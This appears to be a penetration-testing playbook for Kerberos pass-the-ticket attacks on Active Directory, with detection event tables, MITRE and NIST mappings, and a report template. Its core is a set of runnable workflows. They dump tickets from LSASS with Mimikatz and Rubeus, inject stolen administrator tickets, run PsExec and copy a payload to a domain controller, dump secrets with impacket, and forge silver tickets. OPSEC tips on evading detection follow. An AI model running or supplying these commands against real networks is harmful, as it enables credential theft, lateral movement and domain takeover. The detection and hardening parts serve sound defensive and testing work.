# Conducting Pass The Ticket Attack

## API Reference

## Libraries

| Library | Install | Purpose |
|---------|---------|---------|
| impacket | `pip install impacket` | Kerberos ticket manipulation (ticketer.py, getST.py) |
| ldap3 | `pip install ldap3` | AD LDAP queries for SPN and account enumeration |
| pySigma | `pip install pySigma` | Sigma rule parsing and conversion |

## Key Windows Event IDs

| Event ID | Description | Relevance |
|----------|-------------|-----------|
| 4768 | Kerberos TGT request | Golden ticket detection (RC4 = 0x17) |
| 4769 | Kerberos service ticket request | Silver ticket / Kerberoasting |
| 4770 | Kerberos service ticket renewed | Ticket reuse indicator |
| 4771 | Kerberos pre-auth failed | Password spray detection |
| 4624 | Successful logon | Correlate with ticket usage |

## Encryption Type Constants

| Value | Algorithm | Concern |
|-------|-----------|---------|
| 0x17 | RC4-HMAC | Downgrade attack indicator |
| 0x12 | AES-256 | Expected modern encryption |
| 0x11 | AES-128 | Acceptable encryption |

## MITRE ATT&CK Mapping

| Technique | ID |
|-----------|----|
| Use Alternate Authentication Material: Pass the Ticket | T1550.003 |
| Steal or Forge Kerberos Tickets: Golden Ticket | T1558.001 |
| Steal or Forge Kerberos Tickets: Silver Ticket | T1558.002 |

## External References

- [impacket ticketer.py](https://github.com/fortra/impacket/blob/master/examples/ticketer.py)
- [Microsoft Kerberos Event Logging](https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4768)
- [Sigma Rules Repository](https://github.com/SigmaHQ/sigma)
- [ADSecurity.org Kerberos Attacks](https://adsecurity.org/?p=1515)

---

## Standards and Controls

## MITRE ATT&CK

| Technique ID | Name | Tactic |
|-------------|------|--------|
| T1550.003 | Use Alternate Authentication Material: Pass the Ticket | Lateral Movement |
| T1003.001 | OS Credential Dumping: LSASS Memory | Credential Access |
| T1558 | Steal or Forge Kerberos Tickets | Credential Access |
| T1021.002 | Remote Services: SMB/Windows Admin Shares | Lateral Movement |

## Kerberos Ticket Types

| Ticket | Purpose | Lifetime | Encryption |
|--------|---------|----------|-----------|
| TGT (Ticket Granting Ticket) | Authenticates to KDC for TGS requests | 10 hours default | krbtgt NTLM hash |
| TGS (Ticket Granting Service) | Authenticates to specific service | 10 hours default | Service account hash |

## Detection - Windows Event IDs

| Event ID | Description | PtT Indicator |
|----------|-------------|---------------|
| 4768 | TGT Request | Unusual source IP for known user |
| 4769 | TGS Request | Service access from unexpected host |
| 4770 | TGT Renewal | Renewal from different IP than original |
| 4771 | Kerberos Pre-Auth Failed | May indicate ticket reuse attempts |

## NIST SP 800-171
- 3.5.1: Identify system users, processes acting on behalf of users
- 3.5.2: Authenticate identities before allowing access
- 3.1.1: Limit system access to authorized users

## CIS Controls
- Control 6: Access Control Management
- Control 8: Audit Log Management - Monitor Kerberos authentication events

---

## Workflows

## Workflow 1: Mimikatz Ticket Extraction and Injection

### Step 1: Export Tickets from LSASS
```powershell
# Dump all Kerberos tickets from memory
mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" "exit"

# List exported .kirbi files
dir *.kirbi

# Identify high-value tickets (Domain Admin TGTs)
# Look for: [0;xxxxx]-2-0-40e10000-administrator@krbtgt-DOMAIN.LOCAL.kirbi
```

### Step 2: Inject Ticket into Session
```powershell
# Purge existing tickets
mimikatz.exe "kerberos::purge" "exit"

# Or with klist
klist purge

# Import stolen ticket
mimikatz.exe "kerberos::ptt [0;xxxxx]-2-0-40e10000-administrator@krbtgt-DOMAIN.LOCAL.kirbi" "exit"

# Verify ticket is loaded
klist
```

### Step 3: Access Resources
```powershell
# Access file shares as impersonated user
dir \\dc01.domain.local\c$

# Execute commands remotely
PsExec.exe \\dc01.domain.local cmd.exe

# Access admin shares
copy payload.exe \\dc01.domain.local\c$\windows\temp\
```

## Workflow 2: Rubeus Ticket Operations

### Dump and Inject
```powershell
# Dump all tickets (requires local admin)
.\Rubeus.exe dump

# Dump tickets for specific LUID
.\Rubeus.exe dump /luid:0x3e4

# Extract TGT for current user (no admin required)
.\Rubeus.exe tgtdeleg

# Inject ticket from base64
.\Rubeus.exe ptt /ticket:doIFmjCC...base64ticket...

# Create sacrificial process with ticket
.\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /ptt /ticket:base64ticket
```

## Workflow 3: Linux-Based Pass-the-Ticket (Impacket)

### Convert and Use Tickets
```bash
# Convert .kirbi to .ccache
impacket-ticketConverter ticket.kirbi ticket.ccache

# Set environment variable for ticket
export KRB5CCNAME=ticket.ccache

# Use with Impacket tools
impacket-psexec -k -no-pass domain.local/administrator@dc01.domain.local
impacket-smbexec -k -no-pass domain.local/administrator@dc01.domain.local
impacket-wmiexec -k -no-pass domain.local/administrator@dc01.domain.local
impacket-secretsdump -k -no-pass domain.local/administrator@dc01.domain.local

# List accessible shares
impacket-smbclient -k -no-pass domain.local/administrator@dc01.domain.local
```

## Workflow 4: Silver Ticket (Forged TGS)
```powershell
# Create silver ticket with Mimikatz (requires service account NTLM hash)
mimikatz.exe "kerberos::golden /user:administrator /domain:domain.local /sid:S-1-5-21-xxx /target:server.domain.local /service:cifs /rc4:NTLM_HASH /ptt" "exit"

# Create silver ticket with Rubeus
.\Rubeus.exe silver /service:cifs/server.domain.local /rc4:NTLM_HASH /user:administrator /domain:domain.local /sid:S-1-5-21-xxx /ptt
```

## OPSEC Considerations

1. Stolen tickets have limited lifetime (default 10 hours for TGT)
2. TGT reuse from different IP may trigger advanced detection
3. Silver tickets bypass the KDC entirely - harder to detect
4. Use createnetonly in Rubeus to avoid overwriting legitimate tickets
5. Monitor for credential guard which protects Kerberos tickets
6. Be aware that some EDR solutions monitor ticket injection

---

## Working Template

## Document Control
| Field | Value |
|-------|-------|
| Domain | [DOMAIN.LOCAL] |
| Engagement ID | [ID] |
| Date | [DATE] |

---

## 1. Ticket Extraction

| Source Host | Method | Tickets Found | High-Value |
|------------|--------|--------------|------------|
| | Mimikatz/Rubeus | | |

## 2. Ticket Details

| User | Type | Service | Expiry | Encryption |
|------|------|---------|--------|-----------|
| | TGT/TGS | krbtgt/cifs | | RC4/AES |

## 3. Lateral Movement Results

| Target | Access | Method | Evidence |
|--------|--------|--------|----------|
| | Admin/User | PsExec/SMB | Screenshot |

## 4. Recommendations
1. Enable Credential Guard
2. Implement Protected Users group
3. Enable LSASS RunAsPPL protection
4. Monitor Event ID 4769 anomalies
5. Reduce TGT lifetime for admin accounts

## MITRE ATT&CK
- T1550.003 - Pass the Ticket
- T1003.001 - LSASS Memory
